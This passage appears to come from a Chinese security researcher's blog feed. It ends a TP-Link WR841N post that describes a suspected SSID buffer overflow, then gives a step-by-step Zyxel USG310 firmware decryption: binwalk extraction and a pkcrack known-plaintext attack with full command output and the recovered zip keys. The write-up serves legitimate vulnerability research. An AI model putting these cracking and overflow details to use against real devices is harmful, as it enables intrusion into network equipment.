src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902000054726.png" alt="image-20220902000054726"></p><h2 id="0x06-疑似漏洞"><a href="#0x06-疑似漏洞" class="headerlink" title="0x06 疑似漏洞"></a>0x06 疑似漏洞</h2><p>在分析前面的漏洞的时候，看到获取ssid 的值，这一段代码中，strncpy 函数会造成缓冲区溢出的漏洞，因为在v22 将ssid 的值复制给v53 的过程中，复制的字符串的长度是由v21 进行设置的，而v21 字符的数量恰好是我们可以输入的。因此复制给v53的字符串我们可以自己控制，当输入的字符串长度超过了局部变量v53 分配的内存大小的收，就会造成缓冲区溢出的漏洞，和前面CVE-2022-30024 中ping_addr 是一样的。由于手头上没有这一款设备，因此如果有设备的师傅，希望能帮忙验证一下。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902234353910.png" alt="image-20220902234353910"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这三个漏洞的成因都是通过在指针拷贝和处理字符串的时候，并没有考虑内存的问题，比如CVE-2020-8423 漏洞在转义字符的之后，并没有对转义后的字符串进行长度的限制。在CVE-2022-3024漏洞中，ping_addr的长度限制没有固定，反而是由传入的参数进行计算。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/">https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/</a></p><p><a href="https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/">https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/</a></p><p>C program 通过指针复制字符串</p><p><a href="https://cloud.tencent.com/developer/article/1687616">https://cloud.tencent.com/developer/article/1687616</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>USG310_4.70_固件解密分析</title>
    <link href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="USG310-4-70-固件解密分析"><a href="#USG310-4-70-固件解密分析" class="headerlink" title="USG310_4.70_固件解密分析"></a>USG310_4.70_固件解密分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>关于Zyxel 固件的解密和提取的分析，最近的这篇文章给了我一个很好的idea，感兴趣的可以去看一下。</p><p>文章连接：<a href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/</a></p><p>对固件进行漏洞挖掘的第一步，就是从固件中提取我们需要的一些文件和组件，从而进行漏洞分析，但是如果解开固件包的过程中，显示固件已被加密，并且无法确定如何进行解密，那么是特别难受的。从一些常见的固件解密的方式来看，有的固件是压缩的时候进行加密的，那么解密程序或者生成解密密钥的二进制文件有可能会存在和固件包一起的打包出来，那么可以根据确定一些与解密有关的关键信息，和逆向加密算法对加密方式进行对应的破解，但是，i am lazy :) 。 所以通过收集固件的信息，了解其中的加密的一些命令和方式，比如zyxel固件解密所描述，根据一些特殊的组件猜测其解密的方式，尝试去解密固件，虽然这个过程也很艰难，但相对去逆向晦涩难懂的加密算法而言，难度就小很多了。</p><p>另外也可以根据linux中常见的解密工具，比如unzip 来确定固件中的解密方式，如下图所示的这个案例，通过检索unzip信息，获取到了解密的方式和解密密钥。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531223826053.png" alt="image-20220531223826053"></p><p>接下来我来讲述一下关于Zyxel 固件的另一种固件解密的idea,  虽然在固件解密这一块，也并不怎么擅长，但仍希望能给大家带来不一样的想法。</p><h2 id="0x02-固件解包-1"><a href="#0x02-固件解包-1" class="headerlink" title="0x02  固件解包 1"></a>0x02  固件解包 1</h2><p>固件版本：USG310 4.70</p><p>固件下载连接： <a href="https://firmware.cdn.cloud.zyxel.com/firmware/AAPJ/4.72(AAPJ.0)/firmware.zip">https://firmware.cdn.cloud.zyxel.com/firmware/AAPJ/4.72(AAPJ.0)/firmware.zip</a></p><p>固件指令架构： ELF 32-bit MSB executable, MIPS, N32 MIPS64 rel2 version 1 (SYSV), statically linked, stripped</p><p>这里我使用的是 firmware_USG310_4.70(APPJ.0) 固件包， 下载下来之后，这是一个zip 压缩的压缩文件，解压之后的目录如下所示</p><p>后的目录如下所示</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531232958486.png" alt="image-20220531232958486"></p><p>我们要解开的固件是 470AAPJ0C0.bin , 使用zip 查看 470AAPJ0C0.bin。 </p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531094424948.png" alt="image-20220531094424948"></p><p>同时使用zip 解压提取固件包的时候，显示是需要密码的。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531233318654-1654092293991.png" alt="image-20220531233318654"></p><p>但是在 db\etc\zyxel\ftp\conf\目录中，看到了system-defalut.conf 文件，这个文件的大小为 72871和 470AAJ0C0.conf  文件 (72870) 的大小只相差1字节。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531233643518-1654092293991.png" alt="image-20220531233643518"></p><p>如此的巧合让我猜测这两个文件应该是同一个文件，我尝试使用pkcrack 明文攻击来破解，很遗憾，并没有达到我要的破解效果，甚至我在 470AAJ0C0.conf 文件中增加了一个字节，让这两个文件的大小相同，同样没有达到效果。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601221345019.png" alt="image-20220601221345019"></p><p>于是根据<a href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/%EF%BC%8C%E6%88%91%E4%BD%BF%E7%94%A8binwalk">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/，我使用binwalk</a> 解开470AAJ0C0.ri 文件。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220530230602516-1654092293991.png" alt="image-20220530230602516"></p><p>接着使用binwalk 解开 _470AAPJ0C0 文件中的240 文件。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tigerortiger@ubuntu ~/i/g/z/firmware_USG310_4<span class="hljs-number">.70</span>&gt; cd _470AAPJ0C0.ri.extracted/<br>tigerortiger@ubuntu ~/i/g/z/f/_470AAPJ0C0.ri.extracted&gt; ls<br><span class="hljs-number">240</span>  <span class="hljs-number">240.7</span>z<br>tigerortiger@ubuntu ~/i/g/z/f/_470AAPJ0C0.ri.extracted&gt; binwalk -e <span class="hljs-number">240</span><br><br><span class="hljs-type">DECIMAL</span>       HEXADECIMAL     DESCRIPTION<br><span class="hljs-comment">--------------------------------------------------------------------------------</span><br><span class="hljs-number">0</span>             <span class="hljs-number">0x0</span>             ELF, <span class="hljs-number">64</span>-<span class="hljs-type">bit</span> MSB MIPS32 rel2 executable, MIPS, <span class="hljs-keyword">version</span> <span class="hljs-number">1</span> (SYSV)<br><span class="hljs-number">5107864</span>       <span class="hljs-number">0x4DF098</span>        Linux kernel <span class="hljs-keyword">version</span> <span class="hljs-number">3.10</span><span class="hljs-number">.8</span><br><span class="hljs-number">5179656</span>       <span class="hljs-number">0x4F0908</span>        gzip compressed data, maximum compression, <span class="hljs-keyword">from</span> Unix, last modified: <span class="hljs-number">1970</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-keyword">null</span> <span class="hljs-type">date</span>)<br><span class="hljs-number">5196240</span>       <span class="hljs-number">0x4F49D0</span>        Unix <span class="hljs-type">path</span>: /home/sdd1/buildbot/<span class="hljs-number">470</span>-share1100-k3-slave/<span class="hljs-number">470</span>-share1100-k3/build/share1100-r102127-k3/share1100/src/kernel<br><span class="hljs-number">5284016</span>       <span class="hljs-number">0x50A0B0</span>        DES SP2, big endian<br><span class="hljs-number">5284528</span>       <span class="hljs-number">0x50A2B0</span>        DES SP1, big endian<br><span class="hljs-number">5824472</span>       <span class="hljs-number">0x58DFD8</span>        Unix <span class="hljs-type">path</span>: /usr/bin/magic-seed<br><span class="hljs-number">5853384</span>       <span class="hljs-number">0x5950C8</span>        Unix <span class="hljs-type">path</span>: /home/sdd1/buildbot/<span class="hljs-number">470</span>-share1100-k3-slave/<span class="hljs-number">470</span>-share1100-k3/build/share1100-r102127-k3/share1100/src/kernel/arch/mips/<span class="hljs-keyword">include</span>/<span class="hljs-keyword">as</span><br><span class="hljs-number">5939112</span>       <span class="hljs-number">0x5A9FA8</span>        xz compressed data<br><span class="hljs-number">6040223</span>       <span class="hljs-number">0x5C2A9F</span>        Copyright string: &quot;Copyright 2005-2007 Rodolfo Giometti &lt;giometti@linux.it&gt;&quot;<br><span class="hljs-number">6092400</span>       <span class="hljs-number">0x5CF670</span>        Neighborly <span class="hljs-type">text</span>, &quot;NeighborSolicits&quot;<br><span class="hljs-number">6092424</span>       <span class="hljs-number">0x5CF688</span>        Neighborly <span class="hljs-type">text</span>, &quot;NeighborAdvertisementsorts&quot;<br><span class="hljs-number">6097330</span>       <span class="hljs-number">0x5D09B2</span>        Neighborly <span class="hljs-type">text</span>, &quot;neighbor %.2x%.2x.%pM lost rename link %s to %s&quot;<br><span class="hljs-number">6463872</span>       <span class="hljs-number">0x62A180</span>        CRC32 polynomial <span class="hljs-keyword">table</span>, little endian<br><span class="hljs-number">6643248</span>       <span class="hljs-number">0x655E30</span>        Unix <span class="hljs-type">path</span>: /usr/<span class="hljs-keyword">local</span>/zld_udev/sbin/uevent_helper.sh<br><span class="hljs-number">7060288</span>       <span class="hljs-number">0x6BBB40</span>        Flattened device tree, size: <span class="hljs-number">7847</span> bytes, <span class="hljs-keyword">version</span>: <span class="hljs-number">17</span><br><span class="hljs-number">7068160</span>       <span class="hljs-number">0x6BDA00</span>        Flattened device tree, size: <span class="hljs-number">12032</span> bytes, <span class="hljs-keyword">version</span>: <span class="hljs-number">17</span><br><span class="hljs-number">7085520</span>       <span class="hljs-number">0x6C1DD0</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;.&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000002&quot;, file size: &quot;0x00000000&quot;<br><span class="hljs-number">7085632</span>       <span class="hljs-number">0x6C1E40</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;init&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000005&quot;, file size: &quot;0x0000000D&quot;<br><span class="hljs-number">7085764</span>       <span class="hljs-number">0x6C1EC4</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000007&quot;, file size: &quot;0x00000000&quot;<br><span class="hljs-number">7085884</span>       <span class="hljs-number">0x6C1F3C</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/zld_fsextract&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000015&quot;, file size: &quot;0x00017098&quot;<br><span class="hljs-number">7180376</span>       <span class="hljs-number">0x6D9058</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/etc_inittab&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000013&quot;, file size: &quot;0x00000BB8&quot;<br><span class="hljs-number">7183508</span>       <span class="hljs-number">0x6D9C94</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/rw.zip&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000E&quot;, file size: &quot;0x001330BD&quot;<br><span class="hljs-number">8441296</span>       <span class="hljs-number">0x80CDD0</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/zyinit_gpl&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000012&quot;, file size: &quot;0x00055128&quot;<br><span class="hljs-number">8789880</span>       <span class="hljs-number">0x861F78</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/sw_cn60xx.ko&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000014&quot;, file size: &quot;0x000073E0&quot;<br><span class="hljs-number">8819676</span>       <span class="hljs-number">0x8693DC</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/e2fsck&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000E&quot;, file size: &quot;0x0006B64C&quot;<br><span class="hljs-number">9259684</span>       <span class="hljs-number">0x8D4AA4</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/zld_udev&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000010&quot;, file size: &quot;0x0008B460&quot;<br><span class="hljs-number">9830276</span>       <span class="hljs-number">0x95FF84</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/zld_mrd.ko&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000012&quot;, file size: &quot;0x000016D0&quot;<br><span class="hljs-number">9836244</span>       <span class="hljs-number">0x9616D4</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/lkm.lst&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000F&quot;, file size: &quot;0x00000050&quot;<br><span class="hljs-number">9836452</span>       <span class="hljs-number">0x9617A4</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/db.zip&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000E&quot;, file size: &quot;0x00003829&quot;<br><span class="hljs-number">9850956</span>       <span class="hljs-number">0x96504C</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/mke2fs&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000E&quot;, file size: &quot;0x0004239C&quot;<br><span class="hljs-number">10122340</span>      <span class="hljs-number">0x9A7464</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/unzip&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000D&quot;, file size: &quot;0x0002B8B0&quot;<br><span class="hljs-number">10300816</span>      <span class="hljs-number">0x9D2D90</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/platform_support.ko&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000001B&quot;, file size: &quot;0x000048C0&quot;<br><span class="hljs-number">10319580</span>      <span class="hljs-number">0x9D76DC</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/switchdev_char.ko&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000019&quot;, file size: &quot;0x00004DE8&quot;<br><span class="hljs-number">10339660</span>      <span class="hljs-number">0x9DC54C</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/switchdev.ko&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000014&quot;, file size: &quot;0x00009A90&quot;<br><span class="hljs-number">10379360</span>      <span class="hljs-number">0x9E6060</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/fwversion&quot;, file <span class="hljs-type">name</span> length: &quot;0x00000011&quot;, file size: &quot;0x00000158&quot;<br><span class="hljs-number">10379832</span>      <span class="hljs-number">0x9E6238</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;zyinit/zyinit&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000E&quot;, file size: &quot;0x000C0AEC&quot;<br><span class="hljs-number">11169184</span>      <span class="hljs-number">0xAA6DA0</span>        ASCII cpio archive (SVR4 <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> CRC), file <span class="hljs-type">name</span>: &quot;TRAILER!!!&quot;, file <span class="hljs-type">name</span> length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;<br></code></pre></td></tr></table></figure><p>解开240 如下的文件目录包含一下内容，我看到了db.zip。 这让我联想到了 “firmware_USG310_4.70_2\470AAPJ0C0.bin\db\etc\zyxel\ftp\conf&quot; 目录中的system-defalut.conf  文件</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220530231109223-1654092354501.png" alt="image-20220530231109223"></p><p>于是使用unzip解开db.zip 文件，很幸运，这个zip 并没有同 470AAPJ0C0.bin  一样被加密。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531095654808-1654092377775.png" alt="image-20220531095654808"></p><p>可以看到里面有一个 system-default.conf  文件，可以看到这个文件的大小和名称和前面看到的一样大。我认为这个文件和”firmware_USG310_4.70_2\470AAPJ0C0.bin\db\etc\zyxel\ftp\conf&quot; 目录中的system-defalut.conf  文件是同一个文件。这样我又可以使用 pkcrack 进行破解了。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531095902454-1654092377775.png" alt="image-20220531095902454"></p><p>在使用pkcrack 明文攻击进行破解之前，简单的描述一下pkcrack 的攻击原理。</p><h2 id="0x03-pkcrack-明文攻击"><a href="#0x03-pkcrack-明文攻击" class="headerlink" title="0x03 pkcrack 明文攻击"></a>0x03 pkcrack 明文攻击</h2><p>明文攻击<br>该攻击是已知的纯文本攻击，这意味着您必须知道部分加密数据才能破解密码。<br>比如：加密压缩包中有10张图片，其中1张图片你有未加密的源文件。<br>常用工具: ARCHPR 4.53、pkcrack<br>原理：明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件<br>速度：非常快</p><blockquote><p>pkcark 进行明文破解<br>使用pkcrack进行明文破解需要注意一点：压缩包中可能包含多个加密文件，但我们只要持有其中一个文件即可，该文件必须和压缩包中的某个文件一模一样。在破解前，需要先把明文文件进行压缩。如果使用zip命令直接压缩可能会出现压缩率的问题。windows下可以使用7-zip一类的桌面应用进行压缩。使用7-zip进行压缩时，会有一个压缩率的选项，可以调整word size的大小，如果这个压缩率和加密文件的压缩率不匹配，破解时可能会出现文件长度不匹配问题<br>查看压缩率可以借助 zipdetails、360压缩、7zip等查看。<br><a href="https://github.com/keyunluo/pkcrack">https://github.com/keyunluo/pkcrack</a></p></blockquote><p>pkcrack 破解需要两个文件</p><ul><li>需要解密的ZIP文件</li><li>另一个zip文件，其中至少包含未加密的加密存档红的一个文件。必须使用与加密文件相同的压缩方法压缩该文件。</li></ul><blockquote><p>pkcrack -C encrypted-ZIP -c ciphertextname -P plaintext-ZIP -p plaintextname -d decrypted_file -a</p></blockquote><p>encrypted-ZIP：是加密的ZIP归档文件的名称（和路径）<br>ciphertextname：是存档中文件的名称，对于该文件，您具有-纯文本<br>plaintext-ZIP：是包含压缩明文的ZIP归档文件的名称（和路径）<br>plaintextname：是归档文件中包含已知明文的文件名<br>unlocked_file：是解密档案将被写入的文件的名称</p><p><strong>示例</strong></p><blockquote><p>demo<br>├── demo.zip # encrypted-ZIP<br>├── pkcrack<br>├── pkcrack.exe<br>├── README.txt # plaintext<br>└── README.zip # plaintext-ZIP</p></blockquote><p>用shell 命令用于破解</p><blockquote><p>..&#x2F;bin&#x2F;pkcrack -C demo.zip -c README.txt -P README.zip -p README.txt -d cracked.zip -a</p></blockquote><h2 id="0x04-固件解包2"><a href="#0x04-固件解包2" class="headerlink" title="0x04 固件解包2"></a>0x04 固件解包2</h2><p>使用pkcrack 解开固件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tigerortiger@ubuntu ~<span class="hljs-string">/i/g/z/firmware_USG310_4.70</span>&gt; <br>zip -9 470AAPJ0C0.zip system-default.conf <br>  adding: system-default.conf <span class="hljs-params">(deflated 84%)</span><br>tigerortiger@ubuntu ~<span class="hljs-string">/i/g/z/firmware_USG310_4.70</span>&gt; <br><span class="hljs-string">/home/tigerortiger/tools/pkcrack/bin/pkcrack</span> -C 470AAPJ0C0.bin -c db/etc/zyxel/ftp/conf/system-default.conf -P 470AAPJ0C0.zip -p system-default.conf -d cracked.zip -a<br>Generating 1st generation of possible key2_11532 values.<span class="hljs-string">..done.</span><br>Found 4194304 possible key2-values.<br>Now we&#x27;re trying to reduce these.<span class="hljs-string">..</span><br>Lowest number: 989 values at offset 6926<br>Lowest number: 954 values at offset 6924<br>Lowest number: 898 values at offset 5324<br>Done. Left with 898 possible Values. bestOffset is 5324.<br>Stage 1 completed. Starting stage 2 on <br>Ta-daaaaa! key0=184108c9, key1=a102a710, key2=8f550772<br>Probabilistic test succeeded for 6213 bytes.<br>Ta-daaaaa! key0=184108c9, key1=a102a710, key2=8f550772<br>Probabilistic test succeeded for 6213 bytes.<br>Stage 2 completed. Starting zipdecrypt on<br>Decrypting compress.img <span class="hljs-params">(624a9fbe5fcf76c1bdf8eb86)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/ <span class="hljs-params">(863c636d34664e0e43c3858b)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/etc/ <span class="hljs-params">(9438acbd8959952d160c858b)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/etc/zyxel/ <span class="hljs-params">(51b87c5ec94917155458858b)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/etc/zyxel/ftp/ <span class="hljs-params">(b28c0fca7cc7f78ffa8e858b)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/etc/zyxel/ftp/conf/ <span class="hljs-params">(2525dc17bac05f9a4da7858b)</span><span class="hljs-string">...</span> OK!<br>Decrypting db/etc/zyxel/ftp/conf/system-default.conf <span class="hljs-params">(c4c22bea727241c6f6816779)</span><span class="hljs-string">...</span> OK!<br><span class="hljs-string">...</span><br>Decrypting etc_writable/zyxel/conf/__system_default_device_ha.xml <span class="hljs-params">(c83a53734113602259af6779)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/conf/__system_default_dynamic_guest_log.xml <span class="hljs-params">(2061195d4ef1dfcb2b2d6779)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/conf/__wantrunk_default.xml <span class="hljs-params">(d06c63f2a332c4dc718dc085)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/conf/__zwo.xml <span class="hljs-params">(5d594289e3ff7f8d5bebcf86)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/conf/dynamic_guest_log.xml <span class="hljs-params">(f66649f9e313ccd24136868b)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/coredump_script/ <span class="hljs-params">(ae137544f7ad54f9eebd868b)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/coredump_script/common.sh <span class="hljs-params">(dfcc6000cb3ca1609dec1786)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/coredump_script/samples.sh <span class="hljs-params">(5fb2e2a1cae7bbddfe761786)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/coredump_script/sdwan_common.sh <span class="hljs-params">(5160662af82248b81a751786)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/printer/ <span class="hljs-params">(76acf8b17a486b36cfbb868b)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/printer/SP350E.dat <span class="hljs-params">(d8b9df979471623787e18e81)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/printer/double_print.sh <span class="hljs-params">(9f01ea1939359e15be448e81)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/secuextender/ <span class="hljs-params">(0e53686443987b96c859868b)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/secuextender/applet.html <span class="hljs-params">(9df9661a81cfa97ff5ba2e82)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/secuextender/sslapp.jar <span class="hljs-params">(f407182e1b0743d27b67a982)</span><span class="hljs-string">...</span> OK!<br>Decrypting etc_writable/zyxel/selector/ <span class="hljs-params">(296a84395ffc890845b1437f)</span><span class="hljs-string">...</span> OK!<br>Decrypting filechecksum <span class="hljs-params">(b48c0dec79379e4cac83898b)</span><span class="hljs-string">...</span> OK!<br>Decrypting filelist <span class="hljs-params">(878dcff5a799dfe9ef6c8a8b)</span><span class="hljs-string">...</span> OK!<br>Decrypting fwversion <span class="hljs-params">(e223b319d7586e29573e848b)</span><span class="hljs-string">...</span> OK!<br>Decrypting kernelchecksum <span class="hljs-params">(8d701dd63dd56aa385810987)</span><span class="hljs-string">...</span> OK!<br>Decrypting kernelshare1100.bin <span class="hljs-params">(0ef2d6fb1ee26b107de40987)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtp_image/ <span 